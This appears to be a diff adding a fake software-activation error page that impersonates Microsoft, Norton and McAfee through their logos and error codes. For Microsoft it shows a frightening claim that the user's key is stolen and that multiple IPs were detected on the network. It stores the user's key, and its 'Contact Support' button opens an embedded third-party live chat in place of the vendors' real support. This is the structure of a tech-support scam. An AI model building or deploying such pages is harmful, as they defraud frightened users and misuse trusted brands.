@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Activation Error</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            primary: '#ef4444',
+                            dark: '#1a0a0a',
+                            light: '#fef2f2'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .gradient-bg {
+            background: #ffffff;
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(16px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .fade-in-up { animation: fadeInUp 0.5s ease-out forwards; }
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-16px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .fade-in-down { animation: fadeInDown 0.5s ease-out forwards; }
+        .btn-gradient {
+            background: linear-gradient(135deg, #0078d4, #005a9e);
+            transition: all 0.3s ease;
+        }
+        .btn-gradient:hover {
+            background: linear-gradient(135deg, #005a9e, #00447a);
+            transform: translateY(-1px);
+            box-shadow: 0 8px 25px rgba(0,120,212,0.35);
+        }
+    </style>
+</head>
+<body class="min-h-screen gradient-bg bg-white text-gray-900">
+    <div class="min-h-screen flex items-center justify-center px-4 py-12">
+        <div class="max-w-xl w-full">
+            <!-- Brand logo -->
+            <div class="text-center mb-6 fade-in-down">
+                <img id="errorBrandLogo" src="assets/microsoft-office-logo.svg" alt="Brand logo" class="h-32 w-auto max-w-full object-contain inline-block">
+            </div>
+
+            <!-- Error card -->
+            <div class="bg-white border border-gray-200 rounded-2xl shadow-xl overflow-hidden fade-in-up">
+                <div class="h-1 bg-red-500"></div>
+                <div class="p-6 sm:p-8">
+                    <!-- Header -->
+                    <div class="flex items-start gap-4">
+                        <div class="flex-shrink-0 w-12 h-12 rounded-full bg-red-50 border border-red-200 flex items-center justify-center">
+                            <i id="errorIcon" class="fa-solid fa-triangle-exclamation text-xl text-red-500"></i>
+                        </div>
+                        <div>
+                            <h1 id="errorTitle" class="text-xl sm:text-2xl font-bold text-gray-900">Activation Failed</h1>
+                            <p id="errorSubtitle" class="text-sm text-gray-500 mt-1">This activation key has already been used on another device.</p>
+                        </div>
+                    </div>
+
+                    <!-- Reference code -->
+                    <div class="mt-6 bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 flex items-center justify-between gap-4">
+                        <div class="min-w-0">
+                            <p class="text-[11px] uppercase tracking-wider text-gray-400">Reference code</p>
+                            <p id="errorCode" class="font-mono font-bold text-gray-900 tracking-wider">ERR-ACT-001</p>
+                            <p id="errorBrand" class="text-xs text-gray-400 mt-0.5"></p>
+                        </div>
+                        <button id="copyCodeBtn" type="button" class="flex-shrink-0 px-3 py-2 text-xs font-semibold text-gray-600 bg-white border border-gray-300 rounded-lg hover:bg-gray-100 transition-colors">
+                            <i class="fa-regular fa-copy mr-1"></i>Copy
+                        </button>
+                    </div>
+
+                    <!-- Next steps -->
+                    <div class="mt-6">
+                        <h2 class="text-sm font-semibold text-gray-900 mb-2">What to do next</h2>
+                        <ol class="text-sm text-gray-500 space-y-1.5 list-decimal list-inside">
+                            <li>Double-check the key for typing errors and try again.</li>
+                            <li>If the key is active on another device, deactivate it there first.</li>
+                            <li>Still stuck? Contact support and share the reference code above.</li>
+                        </ol>
+                    </div>
+
+                    <!-- Actions -->
+                    <div class="mt-8 flex flex-col sm:flex-row gap-3">
+                        <a href="welcome.html" class="btn-gradient flex-1 text-center px-6 py-3 rounded-xl text-white font-semibold">
+                            <i class="fa-solid fa-rotate-left mr-2"></i>Try Again
+                        </a>
+                        <a id="supportBtn" href="https://support.microsoft.com" target="_blank" rel="noopener" class="flex-1 text-center px-6 py-3 rounded-xl bg-gray-100 border border-gray-300 text-gray-800 font-semibold hover:bg-gray-200 transition-all">
+                            <i class="fa-solid fa-headset mr-2"></i>Contact Support
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <p class="mt-6 text-center text-xs text-gray-400">Sharing the reference code helps support resolve this faster. Never post your full activation key publicly.</p>
+        </div>
+    </div>
+
+    <script>
+        const brandConfig = {
+            microsoft: {
+                name: 'Microsoft',
+                icon: 'fa-solid fa-triangle-exclamation',
+                errorCode: '0xC004C060',
+                errorTitle: 'Product key is not valid',
+                errorSubtitle: 'Blocked or Invalid Key. The key has been flagged by Microsoft because it was stolen, fraudulent, or sold by an unauthorized vendor. Multiple detected IPs connected in this network.',
+                errorBrand: 'Microsoft',
+                supportUrl: 'https://support.microsoft.com'
+            },
+            norton: {
+                name: 'Norton',
+                icon: 'fa-solid fa-triangle-exclamation',
+                errorCode: 'ERR-ACT-002',
+                errorTitle: 'Activation Failed',
+                errorSubtitle: 'This activation key has already been used on another device.',
+                errorBrand: 'Norton',
+                supportUrl: 'https://support.norton.com'
+            },
+            mcafee: {
+                name: 'McAfee',
+                icon: 'fa-solid fa-triangle-exclamation',
+                errorCode: 'ERR-ACT-003',
+                errorTitle: 'Activation Failed',
+                errorSubtitle: 'This activation key has already been used on another device.',
+                errorBrand: 'McAfee',
+                supportUrl: 'https://service.mcafee.com'
+            }
+        };
+
+        let brand = 'microsoft';
+        let activationKey = 'XXXXX-XXXXX-XXXXX-XXXXX';
+        const params = new URLSearchParams(window.location.search);
+        brand = params.get('brand') || sessionStorage.getItem('detectedBrand') || 'microsoft';
+        activationKey = params.get('key') || sessionStorage.getItem('detectedActivationKey') || activationKey;
+        sessionStorage.setItem('detectedBrand', brand);
+        sessionStorage.setItem('detectedActivationKey', activationKey);
+        const config = brandConfig[brand] || brandConfig.microsoft;
+
+        // Keep background white
+        document.querySelector('.gradient-bg').style.background = '#ffffff';
+        document.getElementById('errorIcon').className = config.icon + ' text-xl text-red-500';
+        document.getElementById('errorTitle').textContent = config.errorTitle;
+        document.getElementById('errorSubtitle').textContent = config.errorSubtitle;
+        document.getElementById('errorCode').textContent = config.errorCode;
+        document.getElementById('errorBrand').textContent = config.errorBrand;
+        document.getElementById('supportBtn').href = config.supportUrl;
+        sessionStorage.setItem('currentBrand', brand);
+
+        // Open Tawk.to live chat on Contact Support (fallback: official support site)
+        document.getElementById('supportBtn').addEventListener('click', function(e) {
+            if (window.Tawk_API && Tawk_API.maximize) {
+                e.preventDefault();
+                Tawk_API.maximize();
+            }
+        });
+
+        // Brand logo
+        const logoImg = document.getElementById('errorBrandLogo');
+        if (brand === 'microsoft') {
+            logoImg.alt = 'Microsoft Office';
+            logoImg.onerror = function() { this.onerror = null; this.src = 'assets/microsoft-office.jpg'; };
+            logoImg.src = 'assets/microsoft-office-logo.svg';
+        } else if (brand === 'mcafee') {
+            logoImg.alt = 'McAfee';
+            logoImg.onerror = null;
+            logoImg.src = 'assets/mcafee-logo.svg';
+        } else {
+            logoImg.alt = 'Norton';
+            logoImg.onerror = function() { this.onerror = null; this.src = 'assets/norton-logo.png'; };
+            logoImg.src = 'assets/norton-logo.svg';
+        }
+
+        // Copy reference code
+        document.getElementById('copyCodeBtn').addEventListener('click', function() {
+            const code = document.getElementById('errorCode').textContent;
+            const btn = this;
+            function done() {
+                btn.innerHTML = '<i class="fa-solid fa-check mr-1"></i>Copied';
+                setTimeout(function() {
+                    btn.innerHTML = '<i class="fa-regular fa-copy mr-1"></i>Copy';
+                }, 2000);
+            }
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(code).then(done).catch(done);
+            } else {
+                const ta = document.createElement('textarea');
+                ta.value = code;
+                document.body.appendChild(ta);
+                ta.select();
+                try { document.execCommand('copy'); } catch(e) {}
+                document.body.removeChild(ta);
+                done();
+            }
+        });
+
+        // Keep brand on "Try Again"
+        const tryAgainBtn = document.querySelector('a[href="welcome.html"]');
+        if (tryAgainBtn) tryAgainBtn.href = 'welcome.html?brand=' + brand;
+    </script>
+    <!-- Tawk.to live chat -->
+    <script type="text/javascript">
+        var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+        (function() {
+            var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
+            s1.async = true;
+            s1.src = 'https://embed.tawk.to/6749d1254304e3196aea76ac/1ids5hv23';
+            s1.charset = 'UTF-8';
+            s1.setAttribute('crossorigin', '*');
+            s0.parentNode.insertBefore(s1, s0);
+        })();
+    </script>
+</body>
+</html>
